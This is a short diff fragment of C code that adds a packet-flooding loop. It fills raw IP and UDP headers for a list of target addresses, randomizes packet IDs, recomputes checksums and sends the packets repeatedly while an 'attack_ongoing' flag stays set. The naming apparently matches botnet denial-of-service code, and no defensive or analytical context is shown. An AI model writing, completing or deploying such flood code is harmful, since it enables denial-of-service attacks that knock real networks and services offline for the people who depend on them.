+        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;
+        iph->daddr = addr_sin.sin_addr.s_addr;
+        while (attack_ongoing[0]) {
+            iph->id = rand_next();
+            iph->check = 0;
+            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr) / 2);
+            udph->check = 0;
+            udph->check = checksum_tcpudp(iph, (uint16_t *)udph, sizeof(struct udphdr), sizeof(struct udphdr) + payload_size);
+            sendto(fd, packet, packet_size, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
+        }
+    }
+    free(packet);
     close(fd);
 }
